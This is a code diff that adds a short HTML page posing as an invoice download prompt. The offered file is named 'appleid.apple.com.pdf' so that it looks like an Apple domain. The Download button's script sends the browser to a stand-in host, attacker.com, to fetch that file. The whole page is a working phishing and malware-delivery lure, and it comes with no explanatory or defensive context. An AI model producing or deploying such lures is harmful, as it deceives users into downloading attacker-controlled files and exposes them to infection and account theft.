@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    #downloadPrompt {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #f1f1f1;
+      border: 1px solid #ccc;
+      padding: 10px;
+      z-index: 1000;
+      font-family: sans-serif;
+    }
+    #downloadPrompt button {
+      margin: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div id="downloadPrompt">
+    <p>Download your invoice: appleid.apple.com.pdf</p>
+    <button onclick="handleDownload()">Download</button>
+  </div>
+
+  <script>
+    function handleDownload() {
+      window.location.href = 'https://attacker.com/appleid.apple.com.pdf';
+    }
+  </script>
+</body>
+</html>
